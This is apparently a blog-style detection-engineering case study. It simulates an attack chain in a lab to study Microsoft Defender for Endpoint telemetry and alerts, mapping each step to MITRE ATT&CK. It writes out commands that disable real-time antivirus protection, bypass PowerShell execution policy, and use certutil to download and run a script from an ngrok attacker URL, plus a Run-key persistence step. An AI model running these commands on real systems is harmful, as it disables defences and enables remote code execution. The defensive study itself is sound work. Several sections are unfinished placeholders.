# 🛡️ Detection Engineering Case Study  
## Behavioral Correlation: LOLBins, Persistence & Ransomware Heuristics

---

# 📌 Executive Summary

This case study documents a controlled adversary behavior simulation conducted in a lab environment monitored by Microsoft Defender for Endpoint (MDE).

The goal was **not to evade detection**, but to:

- Intentionally generate realistic attack telemetry
- Observe Defender behavioral detections
- Analyze process trees and log artifacts
- Map activity to MITRE ATT&CK
- Understand behavioral correlation logic

Multiple alerts were triggered, including:

- Living-off-the-Land Binary (LOLBIN) usage
- Behavioral ransomware heuristic (T1486)

No encryption or destructive payloads were deployed.

---

# 🧠 Phase 1 – Planning & Simulation Design

## 🎯 Objective

Simulate a realistic attacker chain to study:

- Process spawning behavior
- Registry modification logs
- PowerShell telemetry
- Network activity
- EDR behavioral correlation

---

## 📋 Planned Attack Chain (High-Level)

1. Modify security configuration (defense impairment)
2. Execute PowerShell script
3. Download file using native Windows utility
4. Create hidden directory
5. Establish persistence via Run key
6. Trigger additional system activity to observe correlation

---

## 🧰 Tools Used (Lab Only)

- Windows VM
- PowerShell
- Native Windows utilities
- Microsoft Defender for Endpoint
- Advanced Hunting (KQL)
- Kali Linux: red team tools

---

## ⚠️ Adversary Simulation Steps

1. On Attacker machine I created a file (maint.ps1) with a script that creates a hidden directory with a "reverse shell" script (just opens the calculator app). It also creates persistence with registry keys that runs on logon.

<img width="750" height="438" alt="image" src="https://github.com/user-attachments/assets/1971e217-14ac-4715-a092-b21b70c70093" />

2. I created a python http server and proxied the connection through ngrok, to create a temporary URL from which I can pull the created file onto the victim machine.
**Commands used on Kali Linux**: `python3 -m http.server 8888` & `ngrok http 8888`

3. On the victim machine I disabled real time monitoring and bypassed execution policy with: `Set-MpPreference -DisableRealtimeMonitoring $true` and `Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass`

4. The previous command allowed certutil to download files from the attacker machine and run the downloaded file.
**Command used:** `certutil -urlcache -split -f https://fisher-promarriage-untremendously.ngrok-free.dev/maint.ps1 maint.ps1`

<img width="650" height="186" alt="image" src="https://github.com/user-attachments/assets/3256cdf0-ce4c-4ad2-af2a-8ca2910c91ea" />

6. After executing the downloaded file, a new file was ready to be executed which could lead to a reverse shell, but I decided to let it just execute calculator.exe

<img width="450" height="918" alt="image" src="https://github.com/user-attachments/assets/d0ca2bac-2888-4499-88fb-ada1aa6f0c84" />


---

# 🔴 Phase 2 – Adversary Simulation (Behavioral)

## 1️⃣ Defense Impairment

**MITRE:** T1562.001 – Disable or Modify Security Tools

**Command:** `Set-MpPreference -DisableRealtimeMonitoring $true`
 
<img width="600" height="80" alt="image" src="https://github.com/user-attachments/assets/2c10fdb7-9ea2-4cbf-9570-f6520cd459e8" />

<img width="650" height="596" alt="image" src="https://github.com/user-attachments/assets/8b0c562e-4be7-4acc-9382-ad61813d5503" />

**Observations**: 
When the command was executed, Microsoft Defender for Endpoint did not record the activity in the DeviceProcessEvents table as initially expected.
Instead, the activity was primarily captured in:
- DeviceEvents (under AdditionalFields)
- DeviceRegistryEvents

This indicates that Defender prioritized logging the configuration change and security state modification rather than the PowerShell process execution itself.

The DeviceEvents table reflected the real-time protection state change, while DeviceRegistryEvents recorded the underlying registry modifications associated with the Defender configuration update.

---

## 2️⃣ Script Execution

**MITRE:** T1059.001 – PowerShell

Observed:

- Execution policy modification: `Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass`
- Script execution from user directory
- Child process spawning

<img width="650" height="1064" alt="image" src="https://github.com/user-attachments/assets/f0ae2c25-925f-4bb2-be2f-43f0cfa9012f" />
 
**Observations**:

Several DeviceEvents entries were generated for the execution policy command. During initial VM onboarding, most related events were executed under NT AUTHORITY\SYSTEM and appeared in the InitiatingProcessCommandLine field. This behavior is expected, as onboarding scripts typically run with elevated system privileges.

For the standalone execution I performed manually, the relevant event was distinguishable by:

The user context (non-SYSTEM account)

The command being recorded under the AdditionalFields section rather than InitiatingProcessCommandLine

This distinction highlights the importance of reviewing both execution context and event field placement when investigating PowerShell-related activity. System-initiated configuration actions may appear differently in telemetry compared to user-driven commands, even when the underlying command is similar.

---

## 3️⃣ Ingress Tool Transfer (LOLBIN)

**MITRE:**

T1218 – Signed Binary Proxy Execution

T1105 – Ingress Tool Transfer

Native Windows utility used to retrieve remote script.

Resulted in:

- Network event log
- Process creation event
- Living-off-the-Land alert

**Command used**: `certutil -urlcache -split -f https://fisher-promarriage-untremendously.ngrok-free.dev/maint.ps1 maint.ps1`

**Alert on LOLbin usage**:

<img width="450" height="950" alt="image" src="https://github.com/user-attachments/assets/b4dbbb15-9781-4324-be68-5ab219690e75" />

**DeviceProcessEvents**:

<img width="700" height="400" alt="image" src="https://github.com/user-attachments/assets/eff3082d-af7e-427d-a7ad-0cd1d45a343f" />

**DeviceNetworkEvents**:

<img width="1000" height="286" alt="image" src="https://github.com/user-attachments/assets/decad965-d464-4606-b0b7-1f3f96e540a5" />


**Observations**:

The execution of certutil.exe was successfully recorded in DeviceProcessEvents, including:
- Process name: certutil.exe
- Full command line with URL and output file
- Parent process: powershell.exe
- User context: non-SYSTEM account

This confirms Defender captured the LOLBIN execution at the process telemetry level.

Additionally, related outbound connections were logged in network telemetry, showing:
- Remote IP addresses
- Remote URLs
- Remote ports (80 and 443)
- Initiating process: certutil.exe

This demonstrates Defender’s ability to correlate process execution with network activity, which is critical when detecting living-off-the-land techniques.

---

## 4️⃣ Hidden Directory Creation

Directory created with:

- Hidden attribute
- System attribute

Observed telemetry:

- File creation events
- Directory attribute modification

> 📷 Insert file event logs  

---

## 5️⃣ Persistence via Registry Run Key

**MITRE:** T1547.001 – Registry Run Keys / Startup Folder

Registry path modified: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`


Observed:

- Registry modification event
- PowerShell command reference in value

> 📷 Insert DeviceRegistryEvents screenshot  

---

# 🚨 Phase 3 – Defender Alerts Triggered

## Alert 1 – Living-off-the-Land Binary Usage

Description:

> Use of native Windows utility to execute or retrieve potentially malicious content.

Triggered by:

- Process chain behavior
- Network activity
- Correlation with prior defense impairment

---

## Alert 2 – Ransomware Behavior Heuristic

**MITRE:** T1486 – Data Encrypted for Impact

Alert indicated:

- Rapid file modifications by SearchApp.exe
- Behavioral ransomware classification

Important finding:

No encryption occurred.

This was a behavioral correlation trigger.

> 📷 Insert ransomware alert screenshot  

---

# 🔎 Phase 4 – Blue Team Investigation

## 📊 Process Tree Analysis
userinit.exe
└── explorer.exe
└── powershell.exe
└── <native utility>


Observations:

- Legitimate signed binaries
- Suspicious command-line parameters
- Clear parent-child relationship

> 📷 Insert process graph screenshot  

---

## 📁 File System Telemetry

Observed:

- Hidden directory creation
- Script file creation
- Cache file modification burst

Example query:

```kql
DeviceFileEvents
| where InitiatingProcessFileName == "<process>"
```


# 🧠 Behavioral Correlation Analysis

Defender likely correlated:

Defense impairment

Script execution

LOLBin usage

Registry persistence

Burst file modification activity

This behavior chain resembles ransomware pre-encryption stages.



# 🔬 Telemetry Comparison: Download Methods


# ⚠️ Disclaimer

This lab was conducted in a controlled environment for defensive research and detection engineering education.

No destructive payloads were executed.
